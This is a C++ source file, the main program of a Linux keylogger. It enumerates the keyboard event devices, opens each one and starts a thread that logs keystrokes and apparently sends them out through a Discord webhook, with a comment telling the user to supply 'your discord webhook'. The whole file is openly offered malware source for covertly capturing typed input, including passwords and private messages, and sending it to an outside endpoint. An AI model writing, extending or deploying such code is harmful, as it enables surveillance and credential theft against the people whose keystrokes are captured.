#include <iostream>
#include <dpp/dpp.h>
#include <vector>
#include <chrono>
#include <thread>
#include <errno.h>
#include <fcntl.h>
//keylogger and find_event_files module headers
#include "keylogger.hpp"
#include "find_event_files.hpp"
//your discord webhook
#include "webhook.hpp"

int main(){ 
    //create a bot object, add logger and create webhook object
    dpp::cluster discord_bot("");
	discord_bot.on_log(dpp::utility::cout_logger());
	dpp::webhook keylog_discord_webhook(WEBHOOK);

    //get all keyboard files paths, throws error if none found 
    std::vector<std::string> KEYBOARD_DEVICES = get_keyboard_event_files();
    if(KEYBOARD_DEVICES.empty()){
        throw std::runtime_error("No keyboards found");
    }

    //create std::thread array with as many elements as found keyboard files
    int keyboard_file_descriptor;
    std::thread keylogger_threads[KEYBOARD_DEVICES.size()];
    //go through every file path, if opens, create thread, if not, cout error, and create thread without parameters
    for (long unsigned int i = 0; i < KEYBOARD_DEVICES.size(); i++)
    {
        if ((keyboard_file_descriptor = open(KEYBOARD_DEVICES[i].c_str(), O_RDONLY)) >= 0)
        {
            keylogger_threads[i] = std::thread(keylogger, keyboard_file_descriptor, std::ref(discord_bot), std::ref(keylog_discord_webhook), i);
        }else{
            std::cout << "Unable to open keyboard file" << std::endl;
            keylogger_threads[i] = std::thread();
        }
    }

    //wait for threads to finish
    for (long unsigned int i = 0; i < KEYBOARD_DEVICES.size(); i++)
    {
        keylogger_threads[i].join();
    }

    return 0;
}
